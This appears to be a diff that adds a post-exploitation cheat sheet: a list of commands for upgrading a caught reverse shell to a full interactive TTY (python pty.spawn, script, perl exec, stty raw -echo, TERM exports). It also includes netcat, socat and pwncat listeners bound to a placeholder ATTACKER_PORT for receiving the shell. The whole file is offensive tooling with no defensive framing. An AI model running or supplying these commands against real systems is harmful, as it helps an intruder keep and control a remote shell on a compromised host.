@@ -1,0 +1,22 @@
+python -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+script -qc /bin/bash /dev/null
+script /dev/null -c bash
+/usr/bin/script -qc /bin/bash /dev/null
+perl -e 'exec "/bin/bash";'
+echo os.system('/bin/bash')
+/bin/sh -i
+# Full TTY upgrade sequence:
+# 1. python3 -c 'import pty;pty.spawn("/bin/bash")'
+# 2. Ctrl+Z (background the shell)
+# 3. stty raw -echo; fg
+# 4. export TERM=xterm-256color
+# 5. stty rows <ROWS> cols <COLS>
+stty raw -echo; fg
+export SHELL=/bin/bash
+export TERM=xterm-256color
+stty rows 40 cols 120
+reset
+rlwrap nc -lvnp ATTACKER_PORT
+socat file:`tty`,raw,echo=0 tcp-listen:ATTACKER_PORT
+pwncat-cs -lp ATTACKER_PORT
